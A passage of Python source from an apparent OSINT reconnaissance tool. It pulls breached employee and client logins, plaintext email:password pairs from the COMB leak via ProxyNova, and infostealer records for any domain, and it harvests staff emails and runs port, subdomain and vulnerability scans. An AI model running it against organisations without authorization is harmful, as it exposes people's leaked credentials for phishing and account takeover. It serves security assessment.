    except Exception as ex:
        chia["employee_status"] = f"error: {ex}"

    # Client logins — fetch pages 1 and 2
    try:
        raw1 = chia_get("CompanyClientLogins", page=1)
        raw2 = chia_get("CompanyClientLogins", page=2)
        logins = chia_parse(raw1) + chia_parse(raw2)
        chia["client_logins"] = [l for l in logins if isinstance(l, dict)][:200]
        results["summary"]["total_clients_leaked"] += len(chia["client_logins"])
    except Exception as ex:
        chia["client_status"] = f"error: {ex}"

    # Company emails
    try:
        raw = chia_get("CompanyEmails")
        emails = chia_parse(raw)
        chia["emails"] = [e for e in emails if isinstance(e, (dict, str))][:200]
        results["summary"]["total_emails_found"] += len(chia["emails"])
    except Exception:
        pass

    # Related domains
    try:
        raw = chia_get("CompanyRelated")
        related = chia_parse(raw)
        chia["related"] = [r for r in related if isinstance(r, (dict, str))][:30]
    except Exception:
        pass

    results["sources"]["chiasmodon"] = chia

    # ══════════════════════════════════════════════════════
    # SOURCE 3: HAVEIBEENPWNED — PUBLIC BREACH LIST (FREE)
    # ══════════════════════════════════════════════════════
    hibp = {"status": "ok", "breaches": [], "domain_breaches": []}

    # Get full public breach list and filter by domain
    try:
        r = req("https://haveibeenpwned.com/api/v3/breaches", timeout=20,
                headers={"User-Agent": "Kumo/1.0 (Security Research)"})
        if r:
            all_breaches = r.json()
            # Match breaches where this domain appears as the breach domain
            dom_lo = domain.lower(); base_lo = dom_lo.split(".")[0]
            matched = [b for b in all_breaches if
                       (dom_lo in (b.get("Domain","") or "").lower()
                        or ((b.get("Domain","") or "").lower() and (b.get("Domain","") or "").lower() in dom_lo))
                       or (len(base_lo)>=5 and base_lo==(b.get("Name","") or "").lower())]
            hibp["domain_breaches"] = [{
                "name":         b.get("Name", ""),
                "title":        b.get("Title", ""),
                "domain":       b.get("Domain", ""),
                "breach_date":  b.get("BreachDate", ""),
                "added_date":   b.get("AddedDate", "")[:10],
                "pwn_count":    b.get("PwnCount", 0),
                "data_classes": b.get("DataClasses", []),
                "description":  re.sub(r'<[^>]+>', '', b.get("Description", ""))[:200],
                "verified":     b.get("IsVerified", False),
            } for b in matched]
            hibp["total_known_breaches"] = len(all_breaches)
            for b in hibp["domain_breaches"]:
                bname = b["title"] or b["name"]
                if bname not in results["summary"]["breach_names"]:
                    results["summary"]["breach_names"].append(bname)
    except Exception as ex:
        hibp["status"] = f"error: {ex}"

    # Per-email lookup (requires HIBP_API_KEY)
    if hibp_key:
        emails_to_check = []
        # Collect emails from chiasmodon results
        for e_item in chia.get("emails", [])[:10]:
            email = e_item if isinstance(e_item, str) else e_item.get("email", "")
            if email and "@" in email:
                emails_to_check.append(email)
        for login in chia.get("employee_logins", [])[:5]:
            email = login.get("email", "")
            if email and "@" in email:
                emails_to_check.append(email)

        email_results = {}
        for email in list(set(emails_to_check))[:10]:
            try:
                r = req(
                    f"https://haveibeenpwned.com/api/v3/breachedaccount/{quote(email)}",
                    timeout=10,
                    headers={"hibp-api-key": hibp_key, "User-Agent": "Kumo/1.0"}
                )
                if r:
                    email_results[email] = [b.get("Name") for b in r.json()]
                import time; time.sleep(1.5)  # HIBP rate limit
            except Exception:
                pass
        if email_results:
            hibp["per_email_breaches"] = email_results

    results["sources"]["hibp"] = hibp

    # ══════════════════════════════════════════════════════

    # ══════════════════════════════════════════════════════
    # SOURCE 4: PROXYNOVA COMB — FREE, NO KEY, 3.2B RECORDS
    # ══════════════════════════════════════════════════════
    #
    # COMB = Combination Of Many Breaches (Feb 2021 leak)
    # 3.2 billion credentials from Netflix, LinkedIn, etc.
    # API: GET https://api.proxynova.com/comb?query=@domain.com
    #      &start=0&limit=100
    # Rate limit: ~100 req/min. Max 100 results per page.
    # We query @domain to get all leaked emails for the domain,
    # then paginate up to 5 pages (500 results max per scan).
    # ══════════════════════════════════════════════════════
    pn = {
        "status": "ok",
        "total_count": 0,
        "lines": [],           # raw "email:password" strings
        "parsed": [],          # [{email, password, redacted}]
        "unique_emails": [],
        "sample_passwords": [], # unique passwords, partially redacted
    }

    try:
        COMB_URL   = "https://api.proxynova.com/comb"
        COMB_QUERY = f"@{domain}"   # search all emails @domain
        COMB_LIMIT = 100
        MAX_PAGES  = 5              # 500 results max to avoid hammering

        all_lines = []
        total_count = 0

        for page in range(MAX_PAGES):
            r = req(
                f"{COMB_URL}?query={quote(COMB_QUERY)}&start={page*COMB_LIMIT}&limit={COMB_LIMIT}",
                timeout=15,
                headers={"User-Agent": "Kumo/1.0 (Security Research)"}
            )
            if not r:
                if page == 0:
                    pn["status"] = "unreachable"
                break

            data = r.json()
            if page == 0:
                total_count = data.get("count", 0)
                pn["total_count"] = total_count

            batch = data.get("lines", [])
            if not batch:
                break
            all_lines.extend(batch)

            # Stop early if we got all results
            if len(all_lines) >= total_count:
                break

            # Small delay to respect ~100 req/min
            import time as _time
            _time.sleep(0.7)

        pn["lines"] = all_lines

        # Parse "email:password" pairs
        seen_emails = set()
        seen_passwords = set()
        parsed = []

        for line in all_lines:
            if ":" not in line:
                continue
            # Split on first colon only — passwords can contain colons
            colon_idx = line.index(":")
            email_part = line[:colon_idx].strip().lower()
            pw_part    = line[colon_idx + 1:].strip()

            # Strict: only accept emails whose domain exactly matches target
            if "@" not in email_part or "." not in email_part:
                continue
            if email_part.split("@")[-1] != domain.lower():
                continue

            seen_emails.add(email_part)

            # Partially redact password for display: show first 3 chars
            pw_display = pw_part[:3] + "●" * max(0, len(pw_part) - 3) if pw_part else ""

            parsed.append({
                "email":    email_part,
                "password": pw_display,
                "pw_len":   len(pw_part),
                "has_password": bool(pw_part),
            })

            # Collect unique password patterns (for risk analysis)
            if pw_part and pw_part not in seen_passwords and len(seen_passwords) < 20:
                seen_passwords.add(pw_part)

        pn["parsed"]          = parsed
        pn["unique_emails"]   = sorted(seen_emails)
        pn["unique_count"]    = len(seen_emails)

        # Build sample password list (partially redacted)
        pn["sample_passwords"] = [
            p[:3] + "●" * max(0, len(p) - 3)
            for p in list(seen_passwords)[:15]
        ]

        # Password strength analysis
        weak_patterns = [
            r'^\d{4,8}$',                    # pure numeric short
            r'^(password|pass|123|abc)',       # common prefixes
            r'^(.)\1{3,}$',                   # repeated chars
            r'^[a-z]{4,8}$',                  # pure lowercase short
        ]
        weak_count = 0
        for p in seen_passwords:
            if any(re.search(pat, p, re.IGNORECASE) for pat in weak_patterns):
                weak_count += 1
        pn["weak_password_count"] = weak_count

        # Push critical findings for plaintext passwords of domain emails
        if pn["unique_count"] > 0:
            results["summary"]["total_employees_leaked"] += pn["unique_count"]
            results["summary"]["critical_findings"].append({
                "source": "proxynova_comb",
                "type": "comb_credentials_found",
                "detail": (
                    f"{pn['unique_count']} unique emails with plaintext passwords "
                    f"in COMB dataset ({pn['total_count']} total records)"
                ),
            })

    except Exception as ex:
        pn["status"] = f"error: {str(ex)}"

    results["sources"]["proxynova_comb"] = pn

    # ══════════════════════════════════════════════════════
    # SOURCE 5: HUDSON ROCK PER-EMAIL STEALER CHECK
    # Collects all emails from: chiasmodon + proxynova
    # and checks each against Hudson Rock Cavalier (free).
    # ══════════════════════════════════════════════════════
    all_stealer_emails = set()
    _dom_lo = domain.lower()

    # ONLY check @domain employee emails — never external/client emails
    # Chiasmodon employee logins — filter to @domain only
    for _login in chia.get("employee_logins", []):
        _em = (_login.get("email") or _login.get("username") or "").lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    # Chiasmodon email list — filter to @domain only
    for _e in chia.get("emails", []):
        _em = (_e if isinstance(_e, str) else (_e.get("email") or _e.get("value") or "")).lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    # ProxyNova — already filtered to @domain by the COMB query
    for _em in pn.get("unique_emails", []):
        _em = _em.lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    results["sources"]["harvested_emails"] = []  # populated separately by email_harvest module

    # Final safety guard — strip any non-@domain email that slipped through
    all_stealer_emails = {e for e in all_stealer_emails if e.endswith("@" + _dom_lo)}

    # Run HR check on collected emails (up to 20, in parallel)
    hr_per_email = {}
    if all_stealer_emails:
        _HR_HDR = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

        def _check_hr_email(email):
            try:
                from urllib.parse import quote as _q
                _r = requests.get(
                    f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={_q(email)}",
                    headers=_HR_HDR, timeout=10, verify=False, allow_redirects=True
                )
                if _r.status_code == 200:
                    _j = _r.json()
                    _stealers = _j.get("stealers", [])
                    if _stealers:
                        _s = _stealers[0]
                        return email, {
                            "compromised":              True,
                            "total_corporate_services": _j.get("total_corporate_services", 0),
                            "total_user_services":      _j.get("total_user_services", 0),
                            "date_compromised":         (_s.get("date_compromised") or "")[:10],
                            "computer_name":            _s.get("computer_name", ""),
                            "operating_system":         _s.get("operating_system", ""),
                            "malware_path":             _s.get("malware_path", ""),
                            "antiviruses":              _s.get("antiviruses", []) or [],
                            "top_passwords":            (_s.get("top_passwords") or [])[:5],
                            "count":                    len(_stealers),
                        }
                    return email, {"compromised": False}
            except Exception:
                pass
            return email, None

        _email_list = sorted(all_stealer_emails)[:20]
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as _hrex:
            for _email, _result in _hrex.map(_check_hr_email, _email_list):
                if _result is not None:
                    hr_per_email[_email] = _result
                    if _result.get("compromised"):
                        results["summary"].setdefault("total_infostealer_hits", 0)
                        results["summary"]["total_infostealer_hits"] += 1
                        results["summary"]["critical_findings"].append({
                            "source": "hudson_rock_email",
                            "type":   "email_infostealer_confirmed",
                            "detail": (
                                f"{_email} — {_result.get('date_compromised','')} "
                                f"💻 {_result.get('computer_name','')} "
                                f"🖥 {_result.get('operating_system','')[:25]}"
                            ),
                        })

    results["sources"]["hr_per_email"] = hr_per_email

    # ══════════════════════════════════════════════════════
    # OSINT DEEP LINKS (always generated, no key needed)
    # ══════════════════════════════════════════════════════
    results["osint_links"] = {
        "HaveIBeenPwned Domain": f"https://haveibeenpwned.com/DomainSearch",
        "ProxyNova COMB":        f"https://www.proxynova.com/tools/comb/?query={d}",
        "IntelX":                f"https://intelx.io/?s={d}",
        "DeHashed":              f"https://dehashed.com/search?query={d}",
        "LeakRadar":             f"https://leakradar.io/search?q={d}",
        "BreachDirectory":       f"https://breachdirectory.org/",
        "Snusbase":              f"https://snusbase.com/",
        "HudsonRock Cavalier":   f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain={d}",
        "Chiasmodon":            f"http://chiasmodon.online/v2/CompanyEmployeLogins?q={d}&key=&page=1",
    }

    return results


# ═══════════════════════════════════════════════════════════════
# MASTER SCAN RUNNER
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
# MODULE: EMAIL HARVESTER
# ═══════════════════════════════════════════════════════════════

def scan_email_harvest(domain):
    """
    Harvest @domain.com employee email addresses from multiple open sources:
      1. Hunter.io public domain search (no key, limited)
      2. crt.sh certificate transparency logs
      3. Web page scraping (contact/about/team pages)
      4. Homepage scrape
      5. DNS SOA record (admin email field)
    Only collects emails — stealer checks happen in breachintel module.
    """
    import re as _re

    emails_found = set()
    sources_used = []
    email_details = {}  # email -> {sources: [...]}

    EMAIL_RE = _re.compile(
        r'\b[A-Za-z0-9._%+\-]+@' + _re.escape(domain) + r'\b',
        _re.IGNORECASE
    )

    def harvest_page(url, label):
        """Fetch a URL and extract all @domain emails."""
        try:
            r = requests.get(url, timeout=6, verify=False, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 Kumo/1.0"})
            if r.status_code == 200:
                found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                if found:
                    sources_used.append(label)
                    for e in found:
                        emails_found.add(e)
                        email_details.setdefault(e, {"sources": []})
                        email_details[e]["sources"].append(label)
        except Exception:
            pass

    # ── Source 1: Hunter.io public domain search ──
    harvest_page(f"https://hunter.io/domain-search?domain={domain}", "hunter.io")

    # ── Source 2: crt.sh — sometimes has email in cert subject/SAN ──
    try:
        r = req(f"https://crt.sh/?q=%25%40{domain}&output=json", timeout=10)
        if r:
            data = r.json()
            for entry in data[:200]:
                name_value = entry.get("name_value", "")
                for e in EMAIL_RE.findall(name_value):
                    emails_found.add(e.lower())
                    email_details.setdefault(e.lower(), {"sources": []})
                    email_details[e.lower()]["sources"].append("crt.sh")
            if emails_found:
                sources_used.append("crt.sh")
    except Exception:
        pass

    # ── Source 3: Web page scraping — parallel, 4s timeout each ──
    scrape_paths = ["/contact", "/contact-us", "/about", "/about-us", "/team", "/support"]
    import threading as _thr3
    _s3_lock = _thr3.Lock()
    def _scrape_path(path):
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}", timeout=4,
                    verify=False, allow_redirects=True,
                    headers={"User-Agent": "Mozilla/5.0 Kumo/1.0"}
                )
                if r.status_code == 200:
                    found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                    if found:
                        with _s3_lock:
                            for e in found:
                                emails_found.add(e)
                                email_details.setdefault(e, {"sources": []})
                                if "web-scrape" not in email_details[e]["sources"]:
                                    email_details[e]["sources"].append("web-scrape")
                        return True
            except Exception:
                continue
        return False
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as _scex:
        if any(list(_scex.map(_scrape_path, scrape_paths))):
            sources_used.append("web-scrape")

    # ── Source 4: Homepage scrape ──
    for scheme in ["https", "http"]:
        try:
            r = requests.get(f"{scheme}://{domain}", timeout=5, verify=False,
                             headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200:
                found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                for e in found:
                    emails_found.add(e)
                    email_details.setdefault(e, {"sources": [], "stealer": None})
                    email_details[e]["sources"].append("homepage")
                if found:
                    sources_used.append("homepage")
            break
        except Exception:
            break

    # ── Source 5: DNS SOA record (often has admin email) ──
    try:
        import dns.resolver as _dns
        soa = _dns.resolve(domain, "SOA")
        for rec in soa:
            # SOA rname field: admin.example.com → admin@example.com
            rname = str(rec.rname).rstrip(".")
            if domain.lower() in rname.lower():
                email_guess = rname.replace(".", "@", 1)
                if "@" in email_guess and EMAIL_RE.match(email_guess):
                    emails_found.add(email_guess.lower())
                    email_details.setdefault(email_guess.lower(), {"sources": []})
                    email_details[email_guess.lower()]["sources"].append("DNS SOA")
                    sources_used.append("DNS SOA")
    except Exception:
        pass


    # Collect unique emails as simple sorted list
    email_list = sorted(emails_found)

    return {
        "total":        len(email_list),
        "emails":       email_list,
        "sources_used": list(set(sources_used)),
        "domain":       domain,
    }


ALL_MODULES = {
    "screenshot":      ("Website Screenshot",                    scan_screenshot),
    "dns":             ("DNS Records + Email Security",          scan_dns),
    "geo":             ("IP Geolocation & ASN",                  scan_geo),
    "whois":           ("WHOIS / RDAP Registration",             scan_whois),
    "ssl":             ("SSL/TLS Certificate",                   scan_ssl),
    "headers":         ("HTTP Security Headers",                 scan_headers),
    "wafw00f":         ("WAF Detection",      scan_wafw00f),
    "ports":           ("Port Scan (70+ ports + banners)",       scan_ports),
    "whatweb":         ("WhatWeb Deep Tech Detection",           scan_whatweb),
    "robots":          ("Robots/Security/Sitemap",               scan_robots),
    "endpoints":       ("Sensitive Endpoints (80+ paths)",       scan_endpoints),
    "nuclei":          ("Vulnerability Scanner (100+ checks)",   scan_nuclei),
    "shodan":          ("Shodan InternetDB + CVEs",              scan_shodan),
    "censys":          ("Censys Hosts + Certificates",           scan_censys),
    "subdomains":      ("Subdomain Discovery", scan_subdomains),
    "brute":           ("Subdomain Brute Force",                 scan_bruteforce),
    "wayback":         ("Wayback Machine Archives",              scan_wayback),
    "email_harvest":   ("Email Harvester (open-source, no key)", scan_email_harvest),
    "breachintel":     ("Breach & Credential Intelligence",      scan_breachintel),
    "dorks":           ("Google Dorks (61)",                     generate_dorks),
    "osint":           ("OSINT Platform URLs (26)",              generate_osint_urls),
}

FAST_SKIP = {"wayback", "brute", "subdomains", "screenshot", "email_harvest"}  # vuln + endpoints run in fast

def run_scan(domain, modules=None, fast=False, callback=None):
    """Run scan modules. callback(module_name, description, result) called per module."""
    domain = clean_domain(domain)
    if not domain:
        return None

    if modules:
        to_run = {k: v for k, v in ALL_MODULES.items() if k in modules}
    elif fast:
        to_run = {k: v for k, v in ALL_MODULES.items() if k not in FAST_SKIP}
    else:
        to_run = ALL_MODULES

    results = {}
    # Cache of ports discovered by Shodan/Censys to enrich port scan
    intel_ports = set()

    for key, (desc, func) in to_run.items():
        try:
            # Inject Shodan/Censys ports into scan_ports if we have them
            if key == "ports":
                result = scan_ports(domain, extra_ports=intel_ports if intel_ports else None)
            else:
                result = func(domain)

            results[key] = result

            # Collect ports from Shodan/Censys for later port scan enrichment
            if key == "shodan":
                for ip_data in result.get("ips", {}).values():
                    for p in (ip_data.get("ports") or []):
                        if isinstance(p, int):
                            intel_ports.add(p)
            elif key == "censys":
                for ip_data in result.get("ip_data", {}).values():
                    for p in (ip_data.get("ports") or []):
                        if isinstance(p, int):
                            intel_ports.add(p)

            if callback:
                callback(key, desc, result)
        except Exception as e:
            results[key] = {"error": str(e)}
            if callback:
                callback(key, desc, {"error": str(e)})

    return results
